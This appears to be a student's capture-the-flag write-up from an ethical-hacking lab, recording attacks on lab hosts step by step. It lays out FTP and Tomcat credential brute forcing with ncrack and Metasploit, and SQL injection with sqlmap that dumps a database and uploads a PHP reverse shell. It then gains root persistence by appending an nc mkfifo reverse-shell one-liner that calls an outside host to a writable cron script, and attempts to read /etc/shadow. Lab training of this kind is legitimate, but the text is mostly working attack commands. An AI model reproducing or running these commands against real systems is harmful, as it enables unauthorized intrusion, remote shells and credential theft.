Ethical-Hacking

flag{adcb1f}:
nmap -p21  -oA flaggor 10.0.0-15.0-254 
Host: 10.0.3.51 ()	Ports: 21/open/tcp//ftp///
searched this on google "password cracking ftp kali"
ncrack -U http_default_users.txt -P adobe_top100_pass.txt ftp://10.0.3.51 
  Discovered credentials for ftp on 10.0.3.51 21/tcp:
  10.0.3.51 21/tcp ftp: 'root' '1234'
https://www.howtogeek.com/412626/how-to-use-the-ftp-command-on-linux/
  ftp 10.0.3.51 
  username:root
  pass:1234
ls
flag{adcb1f4352c6330e2ed29a2a427d80964382b57b270db8}.jpg
-------------------------------------------------------------------------------------------
flag{90b353}:
nmap -p1- 10.0.3.51
nmap -p1- -sV 10.0.3.51
10.0.3.51:8282
http://10.0.3.51:8282/manager/html
msfconsole
set RPORT = 8282
set RHOSTS 10.0.3.51
set USERPASS_FILE http_default_users.txt
set USERPASS_FILE http_default_users.txt
set USERPASS_FILE http_default_users.txt
run 
[!] No active DB -- Credential data will not be saved!
[+] 10.0.3.51:8282 - Login Successful: admin:123456
login on the web 
http://10.0.3.51:8282/hacktheplanet-816494cc2ba913de/
flag{90b353493bf5b1a0bf68f04ed99e7a385cb7083ff57842}
---------------------------------------------------------------------------------------------
flag{521bce}:
run nmap to scan port 80
nmap -p80 10.0.0-15.0-254
http://10.0.2.233/ & found cuiteur
created Accounte user: javid 
navigated around and inspected source and found this
<!-- old page <a id="btnCherche" href="recherche_old.php" title="Search for Users to Follow"></a>-->
inspected source on old version and found:
<!-- flag{521bce72f9772561e4b5618ff6a613474fb18aa40946fa} -->
------------------------------------------------------------------------------------------------------
flag{de3b1c}:
https://www.google.com/search?client=firefox-b-e&q=sql+injectionma
used Burbsuit to save post request on search user "albert"
used sqlmap -r albert.txt --dbs

available databases [5]:
[*] cuiteur
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys

used sqlmap -r albert.txt --tables -D cutieur
Database: cuiteur
[6 tables]
+-----------+
| blablas   |
| estabonne |
| flags     |
| mentions  |
| tags      |
| users     |
+-----------+

sqlmap -r albert.txt --dump  -T flags -D cuiteur

+---------+------------------------------------------------------+
| flag_id | flag                                                 |
+---------+------------------------------------------------------+
| 32f28e  | flag{de3b1c26953c031c37ba1d7bda9bca89e24d7b539392f2} |
+---------+------------------------------------------------------+
------------------------------------------------------------------------------------

flag{3b2000}:
http://10.0.2.233/php/reverse-shell.php
used sqlmap to upload php-reverse-shell.php
sqlmap -r albert.txt --file-write=./php-reverse-shell.php --file-dest=/var/www/html/php/reverse-shell.php
reload the webpage http://10.0.2.233/php/reverse-shell.php
nc -lvnp 2424
 find / -type f -name flag{* 2>/dev/null

/var/www/html/flag{3b2000b9c6cb4f72bdea7affa125b875113ab85283e8ea}.jpg

----------------------------------------------------------------------------------------------------------

flag{9f1f16}:

https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#summary
cat /etc/crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

ls -la /etc/cron*
-rwxrw-rw-   1 www-data www-data  249 Feb 10 13:05 cuiteur-cleaning
cuiteur-cleaning made it possible to use as a script. 


 cat /etc/cron.hourly/cuiteur-cleaning
#!/bin/bash
/usr/bin/find /var/www/html -name *.tmp -exec rm {} +
/bin/rm /tmp/tfl; mkfifo /tmp/tfl; cat /tmp/tfl | /bin/bash -i 2>&1 | nc 192.168.0.8 7878 > /tmp/tfl

https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#rust


echo "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.2 4242 >/tmp/f" >>/etc/cron.hourly/cuiteur-cleaning
$ cat /etc/cron.hourly/cuiteur-cleaning
#!/bin/bash
/usr/bin/find /var/www/html -name *.tmp -exec rm {} +
/bin/rm /tmp/tfl; mkfifo /tmp/tfl; cat /tmp/tfl | /bin/bash -i 2>&1 | nc 192.168.0.8 7878 > /tmp/tfl
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.2 4242 >/tmp/f

-----------------------------------------------------------------------------------------------------------------------------------

flag{f9038f}:
https://www.hackingarticles.in/credential-dumping-sam/


installed the LaZagne



hashcat -h

dictionary wordlist rockyou.txt download

cat /etc/passwd

cat /etc/shadow ---not worked

ls -l /etc/shadow /usr/bin/passwd
stat /usr/bin/passwd



































